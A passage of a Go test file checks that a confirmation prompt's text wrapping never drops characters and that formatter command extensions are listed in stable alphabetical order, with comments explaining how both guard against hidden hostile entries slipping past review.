		t.Fatalf("simple argv should not gain quotes: %q", plain)
	}
}

// TestWrapIndented_PreservesEveryRune is the property the security
// argument rests on: wrapping may add indentation but must never drop a
// character, or a payload could hide in what got trimmed.
func TestWrapIndented_PreservesEveryRune(t *testing.T) {
	const prefix = "  .go  "
	text := strings.Repeat("wörd ", 40) + "tail"
	rows := wrapIndented(prefix, text, overlay.ConfirmBodyTextWidth)
	if len(rows) < 2 {
		t.Fatalf("long text should wrap, got %d row(s)", len(rows))
	}
	var rebuilt strings.Builder
	for i, row := range rows {
		if n := len([]rune(row)); n > overlay.ConfirmBodyTextWidth {
			t.Fatalf("row %d is %d cells wide: %q", i, n, row)
		}
		if i == 0 {
			rebuilt.WriteString(strings.TrimPrefix(row, prefix))
			continue
		}
		rebuilt.WriteString(strings.TrimPrefix(row, strings.Repeat(" ", len(prefix))))
	}
	if rebuilt.String() != text {
		t.Fatalf("wrapping lost or altered content:\ngot  %q\nwant %q", rebuilt.String(), text)
	}
}

// TestSortedFormatExts_IsStable pins alphabetical order: Go's map
// iteration would otherwise reshuffle the command list between prompts,
// making a newly added hostile entry easy to miss when a teammate's
// change re-triggers the prompt.
func TestSortedFormatExts_IsStable(t *testing.T) {
	root := t.TempDir()
	writeFormatConfig(t, root, `{"commands":{"rb":["a"],"go":["b"],"js":["c"],"zz":[]}}`)
	cfg, err := format.Load(root)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	got := sortedFormatExts(cfg)
	want := []string{"go", "js", "rb"}
	if len(got) != len(want) {
		t.Fatalf("got %v want %v (empty argv must be dropped)", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("got %v want %v", got, want)
		}
	}
}
